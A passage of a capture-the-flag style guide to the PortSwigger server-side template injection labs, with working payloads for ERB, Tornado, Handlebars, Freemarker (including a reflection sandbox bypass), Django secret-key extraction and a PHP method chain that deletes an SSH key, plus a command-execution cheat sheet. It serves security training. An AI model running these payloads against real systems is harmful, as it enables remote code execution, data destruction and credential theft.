# Server-Side Template Injection (SSTI) - Complete PortSwigger Labs Guide

**Complete exploitation guide for all 7 PortSwigger Web Security Academy SSTI labs**

## Table of Contents

1. [Introduction to SSTI](#introduction-to-ssti)
2. [Lab 1: Basic SSTI](#lab-1-basic-ssti)
3. [Lab 2: Basic SSTI (Code Context)](#lab-2-basic-ssti-code-context)
4. [Lab 3: SSTI in Unknown Language](#lab-3-ssti-in-unknown-language)
5. [Lab 4: SSTI Using Documentation](#lab-4-ssti-using-documentation)
6. [Lab 5: SSTI with Information Disclosure](#lab-5-ssti-with-information-disclosure)
7. [Lab 6: SSTI with Custom Exploit](#lab-6-ssti-with-custom-exploit)
8. [Lab 7: SSTI in Sandboxed Environment](#lab-7-ssti-in-sandboxed-environment)
9. [Template Engine Reference](#template-engine-reference)
10. [Exploitation Techniques](#exploitation-techniques)
11. [Burp Suite Workflows](#burp-suite-workflows)
12. [Prevention Strategies](#prevention-strategies)

---

## Introduction to SSTI

### What is Server-Side Template Injection?

Server-side template injection (SSTI) occurs when an attacker can inject malicious code into templates that execute on the server. This vulnerability arises when user input is concatenated directly into templates rather than being passed as data.

### How SSTI Works

**Vulnerable Pattern:**
```python
# VULNERABLE: User input concatenated into template
template = "Hello " + user_input + "!"
render(template)
```

**Safe Pattern:**
```python
# SAFE: User input passed as data
template = "Hello {{name}}!"
render(template, data={"name": user_input})
```

### Impact Levels

- **Critical**: Remote code execution, full server compromise
- **High**: File system access, internal network pivoting
- **Medium**: Information disclosure, framework internals exposure
- **Low**: Template injection with sandboxing

### Detection Methodology

**Phase 1: Fuzzing**
- Inject special characters: `${{<%[%'"}}%\`
- Test mathematical expressions: `${7*7}`, `{{7*7}}`
- Monitor for errors or evaluation results

**Phase 2: Identification**
- Analyze error messages for template engine hints
- Test engine-specific syntax
- Use decision trees to narrow possibilities

**Phase 3: Exploitation**
- Research engine documentation
- Explore accessible objects and methods
- Construct custom exploitation chains

---

## Lab 1: Basic SSTI

### Lab Information

- **Difficulty**: Apprentice
- **Template Engine**: ERB (Embedded Ruby)
- **Objective**: Delete `/home/carlos/morale.txt`
- **URL Pattern**: `/?message=PAYLOAD`

### Vulnerability Description

The application uses ERB template engine and directly concatenates user input from the `message` parameter into template rendering without sanitization.

### Step-by-Step Solution

#### Step 1: Identify the Vulnerability

Navigate to any product page and observe the URL uses a `message` parameter:
```
https://LAB-ID.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```

#### Step 2: Test Template Injection

**Test Payload:**
```erb
<%= 7*7 %>
```

**URL Encoded:**
```
/?message=<%25%3d+7*7+%25>
```

**Expected Result:** Browser displays `49`, confirming server-side evaluation.

#### Step 3: Research ERB Execution

ERB is Ruby-based and has access to Ruby methods:
- `system()` - Execute OS commands
- Backticks - Execute shell commands
- `exec()` - Execute and replace process

#### Step 4: Craft Exploitation Payload

**Final Payload:**
```erb
<%= system("rm /home/carlos/morale.txt") %>
```

**URL Encoded:**
```
/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

#### Step 5: Execute and Verify

Access the crafted URL. The template executes the system command and deletes the target file.

### Complete HTTP Request

```http
GET /?message=<%25+system("rm+/home/carlos/morale.txt")+%25> HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
```

### Key Takeaways

- ERB uses `<%= expression %>` for output and `<% code %>` for execution
- Ruby's `system()` method provides direct OS command execution
- URL encoding required for special characters
- No authentication or complex exploitation needed

---

## Lab 2: Basic SSTI (Code Context)

### Lab Information

- **Difficulty**: Practitioner
- **Template Engine**: Tornado (Python)
- **Credentials**: `wiener:peter`
- **Objective**: Delete `/home/carlos/morale.txt`
- **Injection Point**: `blog-post-author-display` parameter

### Vulnerability Description

Unlike Lab 1, this vulnerability exists within a code context. The user input is already inside a template expression `{{user.name}}`, requiring escape from the existing context before injecting new code.

### Step-by-Step Solution

#### Step 1: Authentication

Login with credentials:
- Username: `wiener`
- Password: `peter`

#### Step 2: Post a Test Comment

Navigate to any blog post and submit a comment to test author name display.

#### Step 3: Locate Injection Point

Navigate to "My account" page and find the preferred name display option.

#### Step 4: Intercept Request

Use Burp Proxy to capture the POST request:
```http
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-TOKEN
Content-Type: application/x-www-form-urlencoded

blog-post-author-display=user.name
```

#### Step 5: Test Template Injection

**Test Payload:**
```
user.name}}{{7*7
```

Send the modified request and reload the comment page.

**Expected Output:** `Peter Wiener49}}` - confirming template injection and showing we need to close the expression properly.

#### Step 6: Research Tornado Syntax

Tornado template syntax:
- Output: `{{expression}}`
- Execution: `{% python_code %}`
- Import: `{% import module %}`

#### Step 7: Craft Breaking Payload

**Analysis:**
- Current context: `{{user.name}}`
- Close it with: `}}`
- Execute code with: `{% import os %}`
- Output result: `{{os.system('command')}}`

**Final Payload:**
```python
user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')
```

#### Step 8: Execute Payload

**Complete HTTP Request:**
```http
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-TOKEN
Content-Type: application/x-www-form-urlencoded

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

Reload the comment page to trigger template rendering and execute the payload.

### Burp Suite Features Used

- **Proxy**: Intercept HTTP traffic
- **HTTP History**: Review request/response flow
- **Repeater**: Modify and resend requests iteratively

### Key Takeaways

- Code context requires breaking out of existing expressions
- Different template engines have different execution syntax
- Understanding template context is critical for exploitation
- URL encoding needed for special characters like `%` and space

---

## Lab 3: SSTI in Unknown Language

### Lab Information

- **Difficulty**: Practitioner
- **Template Engine**: Handlebars (initially unknown)
- **Objective**: Delete `/home/carlos/morale.txt`
- **Challenge**: Identify engine through fingerprinting

### Vulnerability Description

This lab tests the ability to identify unknown template engines through error analysis and leverage documented exploits found online.

### Step-by-Step Solution

#### Step 1: Identify Injection Point

Observe the `message` parameter in product pages:
```
/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```

#### Step 2: Template Engine Fingerprinting

**Fuzzing Payload:**
```
${{<%[%'"}}%\
```

This payload contains mixed syntax from multiple template engines:
- `${}` - Django, Freemarker
- `{{}}` - Tornado, Jinja2, Handlebars
- `<% %>` - ERB
- `[% %]` - Velocity

**Purpose:** Trigger an error message that reveals the engine name.

#### Step 3: Analyze Error Message

Submit the fuzzing payload and observe the error:
```
Error: Handlebars template compilation failed
...
```

**Discovery:** The application uses **Handlebars** template engine (Node.js/JavaScript).

#### Step 4: Research Handlebars Exploits

Search online for: "Handlebars server-side template injection"

**Key Finding:** Well-known exploit by `@Zombiehelp54` that achieves RCE through object chain traversal.

#### Step 5: Understand the Exploit

The Handlebars exploit leverages:
1. `#with` helper to create contexts
2. String manipulation methods
3. Access to `constructor` property
4. Node.js `require()` function
5. `child_process` module for command execution

#### Step 6: Construct Exploitation Payload

**Complete Payload:**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Step 7: URL Encode and Execute

Apply URL encoding and inject via the `message` parameter.

**Simplified URL format:**
```
/?message=URL_ENCODED_PAYLOAD
```

### Payload Breakdown

**Step-by-Step Analysis:**

1. **Create String Context:**
   ```handlebars
   {{#with "s" as |string|}}
   ```
   Creates a context with the string "s" accessible as `string`

2. **Access Constructor:**
   ```handlebars
   {{this.push (lookup string.sub "constructor")}}
   ```
   Uses `lookup` to access the constructor of string.sub

3. **Inject Malicious Code:**
   ```handlebars
   {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
   ```
   Pushes JavaScript code that loads child_process module

4. **Execute the Code:**
   ```handlebars
   {{#with (string.sub.apply 0 codelist)}}
   ```
   Uses `apply` to execute the injected code with Function constructor

### Alternative Fingerprinting Methods

**Test ERB (Ruby):**
```erb
<%= 7*7 %>
```
If output is 49, it's ERB.

**Test Tornado (Python):**
```python
{{7*7}}
```
If output is 49, it's Tornado or similar.

**Test Freemarker (Java):**
```freemarker
${7*7}
```
If output is 49, it's Freemarker.

### Burp Suite Features Used

- **Intruder**: Automate fuzzing with multiple payloads
- **Repeater**: Test different engine-specific syntax
- **Scanner**: May detect SSTI vulnerabilities automatically

### Key Takeaways

- Fuzzing with polyglot payloads reveals template engines
- Error messages are valuable for fingerprinting
- Many SSTI exploits are publicly documented
- Complex object chains can bypass simple restrictions
- Template helpers and built-in functions are attack surfaces

---

## Lab 4: SSTI Using Documentation

### Lab Information

- **Difficulty**: Practitioner
- **Template Engine**: Freemarker (Java-based)
- **Credentials**: `content-manager:C0nt3ntM4n4g3r`
- **Objective**: Delete `/home/carlos/morale.txt`
- **Challenge**: Use official documentation to find exploitation methods

### Vulnerability Description

This lab tests the ability to read and understand official template engine documentation to discover dangerous functionality and construct exploits from scratch.

### Step-by-Step Solution

#### Step 1: Authentication

Login with provided credentials:
- Username: `content-manager`
- Password: `C0nt3ntM4n4g3r`

#### Step 2: Access Template Editor

Navigate to the product description template editor.

#### Step 3: Identify Template Engine

**Test Payload:**
```freemarker
${foobar}
```

This references a non-existent object to trigger an error.

**Error Response:**
```
Freemarker template error: foobar is undefined
...
```

**Discovery:** Template engine is **Freemarker** (Java-based).

#### Step 4: Research Freemarker Documentation

Visit official Freemarker documentation at: `freemarker.apache.org`

Navigate to **FAQ** section and find:
> "Can I allow users to upload templates and what are the security implications?"

**Key Warning:** The `new()` built-in function is highlighted as dangerous.

#### Step 5: Study Built-in Reference

Access "Built-in Reference" documentation:

**Critical Finding:**
- `new()` built-in can instantiate arbitrary Java objects
- Objects must implement `TemplateModel` interface
- This is explicitly marked as dangerous

#### Step 6: Examine TemplateModel JavaDoc

Access Freemarker JavaDoc for `TemplateModel` interface:
```
freemarker.apache.org/api/freemarker/template/TemplateModel.html
```

Navigate to **"All Known Implementing Classes"** section.

**Critical Discovery:**
```
freemarker.template.utility.Execute
```

The `Execute` class:
- Implements `TemplateModel` interface
- Designed to execute shell commands
- Perfect for exploitation

#### Step 7: Construct Exploitation Payload

**Complete Payload:**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("rm /home/carlos/morale.txt")}
```

**Payload Breakdown:**

1. **Variable Assignment:**
   ```freemarker
   <#assign ex="freemarker.template.utility.Execute"?new()>
   ```
   - `<#assign var=value>` - Freemarker variable declaration
   - `"className"?new()` - Instantiate Java class
   - Result: `ex` variable holds Execute object instance

2. **Command Execution:**
   ```freemarker
   ${ex("command")}
   ```
   - `${}` - Output expression syntax
   - `ex("command")` - Call Execute object with command string
   - Execute runs the OS command and returns result

#### Step 8: Deploy Payload

1. Remove any test syntax (like `${foobar}`)
2. Insert the complete exploitation payload
3. Save the template
4. View the product page to trigger execution

### Freemarker Syntax Reference

**Output Expressions:**
```freemarker
${variable}           # Interpolate variable
${object.method()}    # Call method
${"string"}          # String literal
${7*7}               # Mathematical expression
```

**Directives:**
```freemarker
<#assign name=value>              # Variable declaration
<#if condition>...</#if>          # Conditional
<#list items as item>...</#list>  # Iteration
```

**Built-in Functions:**
```freemarker
${"ClassName"?new()}    # Instantiate object (dangerous!)
${string?upper_case}    # String manipulation
${number?string}        # Type conversion
```

### Documentation Research Path

1. **Freemarker FAQ** → Security implications
2. **Built-in Reference** → `new()` function documentation
3. **JavaDoc** → `TemplateModel` interface
4. **JavaDoc** → Find implementing classes
5. **JavaDoc** → `Execute` class details

### Alternative Exploitation Classes

If `Execute` is unavailable, other potentially dangerous classes:

```freemarker
<#assign rt="freemarker.template.utility.ObjectConstructor"?new()>
${rt("java.lang.Runtime").getRuntime().exec("command")}
```

### Burp Suite Features Used

- **Proxy**: Capture authentication and template submissions
- **Repeater**: Test template payloads iteratively
- **Scanner**: May identify SSTI vulnerabilities

### Key Takeaways

- Official documentation often reveals dangerous functionality
- Security warnings in documentation indicate attack vectors
- Java-based templates can instantiate arbitrary objects
- The `TemplateModel` interface requirement is key to Freemarker exploitation
- Reading documentation is a critical pentesting skill

---

## Lab 5: SSTI with Information Disclosure

### Lab Information

- **Difficulty**: Practitioner
- **Template Engine**: Django (Python-based)
- **Credentials**: `content-manager:C0nt3ntM4n4g3r`
- **Objective**: Extract `SECRET_KEY` (not file deletion)
- **Attack Type**: Information disclosure

### Vulnerability Description

This lab demonstrates SSTI for information disclosure rather than RCE. The goal is to access Django's internal `settings` object to extract the application's secret key.

### Step-by-Step Solution

#### Step 1: Authentication

Login with credentials:
- Username: `content-manager`
- Password: `C0nt3ntM4n4g3r`

#### Step 2: Access Template Editor

Navigate to product description templates and select one for editing.

#### Step 3: Identify Template Engine

**Fuzzing Payload:**
```
${{<%[%'"}}%\
```

**Error Response:**
```
TemplateSyntaxError at /product
...Django template error...
```

**Discovery:** Template engine is **Django** (Python framework).

#### Step 4: Research Django Template Tags

Consult Django documentation for built-in template tags:
```
docs.djangoproject.com/en/stable/ref/templates/builtins/
```

**Critical Finding:**
```django
{% debug %}
```

The `debug` template tag displays debugging information including:
- Available template variables
- Template context
- Accessible objects

#### Step 5: Invoke Debug Tag

**Payload:**
```django
{% debug %}
```

Insert this into the template and save.

#### Step 6: Analyze Debug Output

View the product page. The debug output reveals:

```python
Context:
{
    'product': <Product object>,
    'user': <User object>,
    'request': <WSGIRequest object>,
    'settings': <Settings object>,
    ...
}
```

**Critical Discovery:** The `settings` object is accessible in the template context!

#### Step 7: Research Django Settings Object

Django documentation warns:
> "SECRET_KEY has dangerous security implications if known to an attacker"

The SECRET_KEY is used for:
- Cryptographic signing
- Session management
- CSRF token generation
- Password reset tokens

#### Step 8: Extract SECRET_KEY

**Final Payload:**
```django
{{settings.SECRET_KEY}}
```

Insert this payload, save the template, and view the product page.

**Output Example:**
```
zp4y8c9x7b2d3j6k1m5n8q9r0s1t2u3v4w5x6y7z8a9b0c1d2e3f4g5h6j7k8l9m0
```

#### Step 9: Submit Solution

Copy the extracted SECRET_KEY and submit via the "Submit solution" button.

### Django Template Syntax Reference

**Variables:**
```django
{{variable}}              # Output variable
{{object.attribute}}      # Access attribute
{{object.method}}         # Call method (no parentheses)
{{dict.key}}             # Dictionary access
```

**Tags:**
```django
{% tag %}                 # Execute tag
{% if condition %}...{% endif %}
{% for item in list %}...{% endfor %}
{% debug %}              # Debug information
{% load library %}       # Load template library
```

**Filters:**
```django
{{value|filter}}         # Apply filter
{{text|upper}}           # Uppercase
{{list|join:", "}}       # Join list
```

### Security Implications of SECRET_KEY

**What Attackers Can Do:**

1. **Session Hijacking:**
   - Forge session cookies
   - Impersonate any user
   - Bypass authentication

2. **CSRF Token Forgery:**
   - Generate valid CSRF tokens
   - Execute cross-site requests
   - Bypass CSRF protection

3. **Password Reset Token Manipulation:**
   - Generate password reset tokens
   - Reset any user's password
   - Account takeover

4. **Data Tampering:**
   - Modify signed data
   - Bypass integrity checks
   - Inject malicious payloads

### Other Interesting Django Objects

```django
{{settings.DATABASES}}           # Database configuration
{{settings.DEBUG}}               # Debug mode status
{{settings.INSTALLED_APPS}}      # Application list
{{user}}                         # Current user object
{{request.META}}                 # HTTP headers
{{request.GET}}                  # GET parameters
{{request.POST}}                 # POST parameters
{{request.session}}              # Session data
```

### Burp Suite Features Used

- **Proxy**: Intercept template edit requests
- **HTTP History**: Review template submissions
- **Scanner**: May detect information disclosure

### Key Takeaways

- SSTI isn't always about RCE - data theft is critical
- Debug features are dangerous in production
- Framework objects expose sensitive configuration
- Template context enumeration reveals attack surface
- Django's SECRET_KEY compromise is a critical vulnerability

---

## Lab 6: SSTI with Custom Exploit

### Lab Information

- **Difficulty**: Expert
- **Template Engine**: Custom/PHP-based
- **Credentials**: `wiener:peter`
- **Objective**: Delete `/home/carlos/.ssh/id_rsa`
- **Challenge**: No documented exploits, custom object analysis required

### Vulnerability Description

This expert-level lab requires creating a completely custom exploit by discovering and chaining application-specific objects and methods. Standard SSTI payloads won't work - you must abuse developer-created functionality.

### Step-by-Step Solution

#### Phase 1: Reconnaissance

##### Step 1: Authentication and Initial Testing

Login with credentials:
- Username: `wiener`
- Password: `peter`

##### Step 2: Post Test Comment

Navigate to any blog post and submit a comment to enable author name testing.

##### Step 3: Locate Vulnerability

Navigate to "My account" page and find the preferred name / author display settings.

**Discovery:** This feature is vulnerable to template injection.

##### Step 4: Discover Available Objects

Test template expressions to enumerate accessible objects:

**Test Payload:**
```
{{user}}
```

**Result:** The `user` object is accessible in templates. This is a developer-supplied object, not a framework built-in.

##### Step 5: Trigger Information Disclosure

Navigate to avatar upload functionality and upload an invalid file (e.g., a text file instead of an image).

**Critical Error Message:**
```
PHP Fatal error: Call to user.setAvatar() with incorrect parameters
File: /home/carlos/User.php
Line: 42
```

**Key Discoveries:**
- Method `user.setAvatar()` exists
- Source file: `/home/carlos/User.php`
- Error messages leak implementation details

#### Phase 2: Exploitation Development

##### Step 6: Test setAvatar() Method

**Initial Payload:**
```
user.setAvatar('/etc/passwd')
```

**Error Result:**
```
Missing argument 2: MIME type required
```

**Discovery:** Method signature is `setAvatar(filepath, mimetype)`

##### Step 7: Provide Required Parameters

**Refined Payload:**
```
user.setAvatar('/etc/passwd','image/jpg')
```

Submit and trigger template rendering.

**Result:** No error - method executes successfully!

##### Step 8: Verify Arbitrary File Read

Access the avatar endpoint:
```
GET /avatar?avatar=wiener
```

**Response:** Returns `/etc/passwd` contents!

**Achievement:** Arbitrary file read capability confirmed.

##### Step 9: Read PHP Source Code

**Payload:**
```
user.setAvatar('/home/carlos/User.php','image/jpg')
```

Access avatar endpoint to retrieve the file.

**Source Code Discovery:**
```php
class User {
    private $avatar;

    public function setAvatar($filepath, $mimetype) {
        $this->avatar = array(
            'path' => $filepath,
            'mime' => $mimetype
        );
    }

    public function gdprDelete() {
        unlink($this->avatar['path']);
    }

    // ... other methods ...
}
```

**Critical Finding:** The `gdprDelete()` method deletes the file currently set as avatar!

##### Step 10: Chain Methods for Exploitation

**Strategy:**
1. Use `setAvatar()` to point to target file
2. Use `gdprDelete()` to delete that file

**Payload 1 - Set Target:**
```
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```

**HTTP Request:**
```http
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-TOKEN
Content-Type: application/x-www-form-urlencoded

blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```

##### Step 11: Execute Deletion

**Payload 2 - Delete File:**
```
user.gdprDelete()
```

**HTTP Request:**
```http
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-TOKEN
Content-Type: application/x-www-form-urlencoded

blog-post-author-display=user.gdprDelete()
```

View a comment to trigger template rendering and execute the deletion.

**Result:** SSH private key deleted, lab solved!

### Complete Attack Flow

```
1. Enumerate Objects
   → Discovery: user object accessible

2. Trigger Errors
   → Discovery: setAvatar() method exists
   → Discovery: Source file location

3. Read Source Code
   → Discovery: gdprDelete() method

4. Test Individual Methods
   → Confirm: setAvatar() works
   → Confirm: Arbitrary file read possible

5. Chain Methods
   → setAvatar('/target/file', 'mime')
   → gdprDelete()

6. Achieve Objective
   → Target file deleted
```

### Method Chaining Techniques

**Sequential Execution:**
```
user.setAvatar('/etc/passwd','image/jpg')
user.gdprDelete()
```

**Conditional Execution:**
```
user.avatar ? user.gdprDelete() : user.setAvatar('/file','mime')
```

**Nested Calls:**
```
user.setAvatar(user.getHomePath() + '/.ssh/id_rsa', 'image/jpg')
```

### Information Gathering Techniques

**1. Error Messages:**
- Upload invalid files
- Call methods with wrong parameters
- Reference non-existent properties

**2. Object Enumeration:**
```
{{user}}
{{product}}
{{request}}
{{session}}
```

**3. Method Discovery:**
- Try common method names
- Read leaked source code
- Analyze JavaScript/API responses

**4. Parameter Testing:**
- Call with no arguments
- Call with wrong types
- Observe error messages

### Lab Stability Warnings

**Critical:**
- Improper method invocation can break the lab
- Requires 20-minute cooldown to reset
- Test carefully before executing

**Safe Testing:**
1. Test on non-critical files first
2. Verify each step works individually
3. Understand method behavior before chaining

### Burp Suite Features Used

- **Proxy**: Intercept POST requests
- **Repeater**: Test method calls iteratively
- **HTTP History**: Track request sequences
- **Intruder**: Could enumerate method names (optional)

### Why Standard Payloads Fail

**No Direct Access:**
- No `Execute` class (Java)
- No `require()` function (Node.js)
- No `os.system()` (Python)
- No `system()` (Ruby)

**Sandboxing:**
- Template engine may restrict dangerous functions
- Cannot instantiate arbitrary classes
- Limited to application-specific objects

**Solution:**
- Abuse application logic
- Chain developer-created methods
- Leverage business functionality

### Key Takeaways

- Expert-level SSTI requires custom exploit development
- Error messages are invaluable for reconnaissance
- Source code analysis reveals exploitation paths
- Method chaining achieves complex objectives
- Application-specific objects are the key attack surface
- Patience and systematic testing are essential
- Understanding application logic > memorizing payloads

---

## Lab 7: SSTI in Sandboxed Environment

### Lab Information

- **Difficulty**: Expert
- **Template Engine**: Freemarker (Java-based, sandboxed)
- **Credentials**: `content-manager:C0nt3ntM4n4g3r`
- **Objective**: Read `/home/carlos/my_password.txt`
- **Challenge**: Bypass sandbox restrictions

### Vulnerability Description

This lab demonstrates a "poorly implemented sandbox" that attempts to restrict dangerous operations but can be bypassed using Java reflection. It showcases how sandboxing untrusted code is "inherently difficult and prone to bypasses."

### Step-by-Step Solution

#### Step 1: Authentication

Login with credentials:
- Username: `content-manager`
- Password: `C0nt3ntM4n4g3r`

#### Step 2: Access Template Editor

Navigate to product description templates and select one for editing.

#### Step 3: Verify Template Engine

Based on Lab 4, we know this is Freemarker. Verify the sandbox is active:

**Test Payload:**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

**Expected Result:** Error or blocked - sandbox prevents direct Execute access.

#### Step 4: Test Reflection Capability

**Reflection Test:**
```freemarker
${product.getClass()}
```

**Expected Result:** Returns class information - reflection is allowed!

This is the key to bypassing the sandbox.

#### Step 5: Understand Sandbox Bypass Strategy

**Sandbox Typically Blocks:**
- Direct file I/O operations
- System command execution
- Access to dangerous classes like `Execute`

**Reflection Allows:**
- Accessing Class objects
- Traversing object hierarchies
- Reaching restricted functionality through indirect paths

#### Step 6: Construct Reflection Chain

**Complete Exploitation Payload:**
```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

### Payload Breakdown - Method Chain Analysis

**Step 1: Get Class Object**
```freemarker
product.getClass()
```
- **Returns:** `Class<?>` object for the product
- **Type:** `java.lang.Class`
- **Purpose:** Entry point for reflection chain

**Step 2: Get Protection Domain**
```freemarker
.getProtectionDomain()
```
- **Returns:** `ProtectionDomain` object
- **Type:** `java.security.ProtectionDomain`
- **Purpose:** Access security context of the code

**Step 3: Get Code Source**
```freemarker
.getCodeSource()
```
- **Returns:** `CodeSource` object
- **Type:** `java.security.CodeSource`
- **Purpose:** Information about where code was loaded from

**Step 4: Get Location**
```freemarker
.getLocation()
```
- **Returns:** `URL` object
- **Type:** `java.net.URL`
- **Purpose:** Base URL/path of the application

**Step 5: Convert to URI**
```freemarker
.toURI()
```
- **Returns:** `URI` object
- **Type:** `java.net.URI`
- **Purpose:** Convert URL to URI for path manipulation

**Step 6: Resolve Target File Path**
```freemarker
.resolve('/home/carlos/my_password.txt')
```
- **Returns:** `URI` object pointing to target file
- **Type:** `java.net.URI`
- **Purpose:** Create absolute file path

**Step 7: Convert Back to URL**
```freemarker
.toURL()
```
- **Returns:** `URL` object for the file
- **Type:** `java.net.URL`
- **Purpose:** Prepare for stream opening

**Step 8: Open Input Stream**
```freemarker
.openStream()
```
- **Returns:** `InputStream` object
- **Type:** `java.io.InputStream`
- **Purpose:** Open file for reading

**Step 9: Read All Bytes**
```freemarker
.readAllBytes()
```
- **Returns:** `byte[]` array
- **Type:** `byte[]`
- **Purpose:** Read entire file contents into memory

**Step 10: Convert to String**
```freemarker
?join(" ")
```
- **Returns:** Space-separated string of decimal ASCII values
- **Type:** `String`
- **Purpose:** Convert byte array to displayable format

### Execution and Output Analysis

#### Step 7: Deploy Payload

Insert the complete reflection chain into the template editor and save.

#### Step 8: Capture Output

View the product page. The output will be decimal ASCII values:

**Example Output:**
```
109 121 80 64 115 115 119 48 114 100
```

Each number represents a character's ASCII decimal value.

#### Step 9: Convert ASCII to Text

**Conversion Methods:**

**Manual Conversion:**
```
109 = 'm'
121 = 'y'
80  = 'P'
64  = '@'
115 = 's'
115 = 's'
119 = 'w'
48  = '0'
114 = 'r'
100 = 'd'
```

**Result:** `myP@ssw0rd`

**Using Python:**
```python
ascii_values = [109, 121, 80, 64, 115, 115, 119, 48, 114, 100]
password = ''.join(chr(val) for val in ascii_values)
print(password)  # myP@ssw0rd
```

**Using Burp Decoder:**
1. Copy space-separated values
2. Convert to hex first (109 = 6D, 121 = 79, etc.)
3. Decode hex to text

#### Step 10: Submit Solution

Enter the decoded password in the "Submit solution" form.

### Why This Bypasses the Sandbox

**Sandbox Restrictions:**
```
✗ Block java.io.File instantiation
✗ Prevent Runtime.exec() calls
✗ Restrict Execute class access
✗ Disable system property reading
```

**Bypass Technique:**
```
✓ Allow getClass() method calls
✓ Allow reflection method chains
✓ Allow ProtectionDomain access
✓ Allow URI/URL manipulation
✓ Allow InputStream creation
```

**Key Insight:**
Each individual method call appears safe in isolation. The sandbox doesn't detect that chaining these "safe" methods leads to restricted functionality.

### Alternative Reflection Chains

**Using Different Base Objects:**

**If `product` unavailable, try:**
```freemarker
${user.getClass()...}
${request.getClass()...}
${"".getClass()...}
```

**Alternative File Reading:**
```freemarker
${product.getClass().getClassLoader().getResource('/home/carlos/my_password.txt').getContent()}
```

**Using Runtime (if not blocked):**
```freemarker
${product.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("cat /home/carlos/my_password.txt")}
```

### Sandbox Implementation Analysis

**What a Proper Sandbox Should Do:**

1. **Whitelist Methods:**
   - Only allow explicitly safe methods
   - Block all reflection methods
   - Prevent class loading

2. **Depth Limiting:**
   - Restrict method call chain depth
   - Monitor repeated getClass() calls
   - Detect object traversal patterns

3. **Type Restrictions:**
   - Block access to security-related classes
   - Prevent InputStream/OutputStream creation
   - Restrict network operations

**Why This Sandbox Fails:**

```java
// VULNERABLE: Only blocks direct dangerous calls
if (method.equals("exec") || method.equals("Runtime")) {
    throw new SecurityException("Blocked");
}
// But allows reflection chains that reach the same functionality!
```

**Better Implementation:**
```java
// BETTER: Whitelist safe methods only
private static final Set<String> ALLOWED_METHODS = Set.of(
    "toString", "equals", "hashCode", "getName", "getValue"
);

if (!ALLOWED_METHODS.contains(method)) {
    throw new SecurityException("Method not allowed: " + method);
}
```

### ASCII Conversion Reference

**Common ASCII Values:**

**Letters:**
```
65-90   = A-Z (uppercase)
97-122  = a-z (lowercase)
```

**Numbers:**
```
48-57 = 0-9
```

**Special Characters:**
```
32  = space
33  = !
64  = @
35  = #
36  = $
37  = %
38  = &
42  = *
```

### Burp Suite Features Used

**Tools:**
- **Proxy**: Intercept template submissions
- **Repeater**: Test reflection chains iteratively
- **Decoder**: Convert ASCII decimal to text
- **Intruder**: Could enumerate accessible objects

**Decoder Workflow:**
1. Copy output: `109 121 80 64...`
2. Convert decimals to hex: `6D 79 50 40...`
3. Decode as ASCII: `myP@ssw0rd`

### Complete HTTP Example

**Template Edit Request:**
```http
POST /edit-template HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-TOKEN
Content-Type: application/x-www-form-urlencoded

template_content=${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

**Template Render Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<body>
    <div class="product-description">
        109 121 80 64 115 115 119 48 114 100
    </div>
</body>
</html>
```

### Comparison: Lab 4 vs Lab 7

**Lab 4 (Unsandboxed Freemarker):**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("rm /home/carlos/morale.txt")}
```
- Direct class instantiation
- Simple exploitation
- No restrictions

**Lab 7 (Sandboxed Freemarker):**
```freemarker
${product.getClass().getProtectionDomain()...openStream().readAllBytes()}
```
- Reflection chain required
- Complex exploitation
- Sandbox bypass needed

### Key Takeaways

- Sandboxes can often be bypassed with creativity
- Java reflection is a powerful bypass mechanism
- Method chaining defeats simple blacklists
- Each "safe" method can combine into dangerous functionality
- Output encoding requires additional decoding step
- Proper sandboxing requires whitelisting, not blacklisting
- Security through obscurity fails against determined attackers
- Template sandboxing is inherently difficult to implement correctly

---

## Template Engine Reference

### ERB (Embedded Ruby)

**Language:** Ruby

**Syntax:**
```erb
<%= expression %>    # Output with escaping
<%- expression %>    # Output without escaping
<% code %>          # Execute without output
<%# comment %>      # Comment
```

**Exploitation:**
```erb
<%= system("whoami") %>
<%= `cat /etc/passwd` %>
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>
```

**Detection:**
```erb
<%= 7*7 %>    # Returns: 49
```

### Tornado (Python)

**Language:** Python

**Syntax:**
```python
{{ expression }}     # Output
{% code %}          # Execute
{% import module %} # Import
```

**Exploitation:**
```python
{% import os %}{{ os.system('whoami') }}
{% import subprocess %}{{ subprocess.check_output('ls') }}
